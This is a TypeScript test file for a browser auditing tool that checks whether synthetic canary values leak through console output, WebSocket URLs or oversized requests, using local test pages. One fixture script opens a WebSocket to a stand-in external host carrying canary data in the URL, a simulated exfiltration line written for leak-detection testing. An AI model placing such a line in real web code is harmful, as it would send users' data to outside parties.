import assert from 'node:assert/strict'
import {createServer} from 'node:http'
import {test} from 'node:test'
import {mkdir, writeFile} from 'node:fs/promises'
import {auditBrowser} from '../../packages/runtime/src/index.js'
import type {RuntimeReport} from '../../packages/runtime/src/index.js'

const evidence: Array<{flow: string; report: RuntimeReport}> = []

test('runtime inspects error fields, map/set entries, binary buffers, circular objects, and WebSocket URLs', async context => {
  const names = ['message', 'cause', 'map', 'set', 'bytes', 'cycle', 'url']
  const canaries = names.map(name => ({name, kind: 'shielded-address' as const, value: `ZTRACE_RUNTIME_${name}_MARKER_642889`, synthetic: true as const}))
  const data = Object.fromEntries(canaries.map(item => [item.name, item.value]))
  let collected = 0
  const server = createServer((request, response) => {
    if (request.url?.startsWith('/collect')) collected++
    response.setHeader('Content-Type', 'text/html')
    response.end(`<!doctype html><script>
      const data=window.__ZTRACE_TEST_DATA__;
      const circular={address:data.cycle};circular.self=circular;
      console.error(new Error(data.message,{cause:{address:data.cause}}));
      console.log(new Map([['address',data.map]]));
      console.log(new Set([data.set]));
      console.log(new TextEncoder().encode(data.bytes));
      console.log(circular);
      new WebSocket('wss://external.example/collect?address='+data.url);
    </script>`)
  })
  await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
  context.after(() => new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve())))
  const endpoint = server.address()
  assert.ok(endpoint && typeof endpoint !== 'string')
  const report = await auditBrowser({url: `http://127.0.0.1:${endpoint.port}`, canaries, testData: data})
  assert.equal(report.completion, 'completed', report.diagnostics.join(','))
  assert.deepEqual(report.findings.filter(item => item.channel === 'console').map(item => item.canary).sort(), names.filter(name => name !== 'url').sort())
  assert.ok(report.findings.some(item => item.channel === 'websocket' && item.canary === 'url'))
  assert.equal(collected, 0)
  for (const canary of canaries) assert.ok(!JSON.stringify(report).includes(canary.value))
  evidence.push({flow: 'console-containers-and-websocket-url', report})
})

test('runtime enforces a deadline across consecutive actions rather than restarting the allowance', async context => {
  const server = createServer((_request, response) => {
    response.setHeader('Content-Type', 'text/html')
    response.end(`<!doctype html><button id="first">First</button><script>
      document.querySelector('#first').onclick=()=>setTimeout(()=>{
        const next=document.createElement('button');next.id='second';next.textContent='Second';
        next.onclick=()=>setTimeout(()=>{const end=document.createElement('button');end.id='third';document.body.append(end)},2000);
        document.body.append(next);
      },2000);
    </script>`)
  })
  await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
  context.after(() => new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve())))
  const endpoint = server.address()
  assert.ok(endpoint && typeof endpoint !== 'string')
  const started = Date.now()
  const report = await auditBrowser({url: `http://127.0.0.1:${endpoint.port}`, timeoutMs: 3000, settleMs: 0,
    canaries: [{name: 'address', kind: 'shielded-address', value: 'ZTRACE_DEADLINE_MARKER_88868', synthetic: true}],
    actions: [{type: 'click', selector: '#first'}, {type: 'click', selector: '#second'}, {type: 'click', selector: '#third'}],
  })
  assert.equal(report.completion, 'incomplete')
  assert.ok(report.diagnostics.includes('RUNTIME_DEADLINE'))
  assert.ok(report.summary.actionsCompleted < 3)
  assert.ok(Date.now() - started < 9000)
  evidence.push({flow: 'overall-deadline', report})
})

test('runtime marks console accessors and oversized requests incomplete without invoking getters or delivering payloads', async context => {
  let delivered = 0
  const server = createServer((request, response) => {
    if (request.url?.startsWith('/collect')) delivered++
    response.setHeader('Content-Type', 'text/html')
    response.end(`<!doctype html><script>
      const object={};Object.defineProperty(object,'address',{enumerable:true,get(){fetch('/collect?getter=ran');return window.__ZTRACE_TEST_DATA__.address}});
      console.log(object);
      fetch('/collect',{method:'POST',body:'x'.repeat(1000001)}).catch(()=>{});
    </script>`)
  })
  await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
  context.after(() => new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve())))
  const endpoint = server.address()
  assert.ok(endpoint && typeof endpoint !== 'string')
  const report = await auditBrowser({url: `http://127.0.0.1:${endpoint.port}`, canaries: [{name: 'address', kind: 'shielded-address', value: 'ZTRACE_LIMIT_MARKER_86995', synthetic: true}]})
  assert.equal(report.completion, 'incomplete')
  assert.ok(report.diagnostics.includes('UNREADABLE_CONSOLE_ARGUMENT'))
  assert.ok(report.diagnostics.includes('RUNTIME_REQUEST_SIZE_LIMIT'))
  assert.equal(delivered, 0)
  evidence.push({flow: 'inspection-bounds-and-getter-isolation', report})
  assert.equal(evidence.length, 3)
  const directory = new URL('../../../runtime/evidence/', import.meta.url)
  await mkdir(directory, {recursive: true})
  await writeFile(new URL('boundaries.json', directory), JSON.stringify({generatedAt: new Date().toISOString(), provenance: 'Three controlled local Chromium flows for console containers, WebSocket URLs, overall deadlines, and inspection limits; synthetic inputs only.', deliveredSensitiveRequests: delivered, flows: evidence}, null, 2) + '\n')
})
